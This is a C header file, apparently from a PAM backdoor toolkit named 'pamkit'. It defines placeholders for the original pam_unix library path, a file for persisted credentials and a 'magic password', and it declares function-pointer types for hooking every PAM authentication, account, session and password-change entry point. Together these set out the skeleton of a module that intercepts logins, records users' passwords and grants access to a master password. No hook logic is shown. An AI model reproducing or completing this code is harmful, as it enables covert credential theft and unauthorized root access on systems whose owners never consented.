#ifndef _PAMKIT_UNIX_H
#define _PAMKIT_UNIX_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/file.h>
#include <security/pam_modules.h>
#include <security/pam_appl.h>
#include <security/_pam_types.h>

#ifdef DEBUG
#include <syslog.h>
#endif 

#define ORIG_PAM_UNIX_PATH "<<SPECIFY>>"
#define PERSISTED_CREDS_PATH "<<SPECIFY>>"
#define PAMKIT_MAGIC_PASSWORD "<<SPECIFY>>"

typedef int (*orig_sm_authenticate_t) (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_setcred_t) (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_acct_mgm_t) (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_chauthtok_t) (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_open_session_t) (pam_handle_t *, int, int, const char **);
typedef int (*orig_sm_close_session_t) (pam_handle_t *, int, int, const char **);

typedef int (*conversation_t) (int, const struct pam_message **, struct pam_response **, void *);

#endif /* _PAMKIT_UNIX_H */
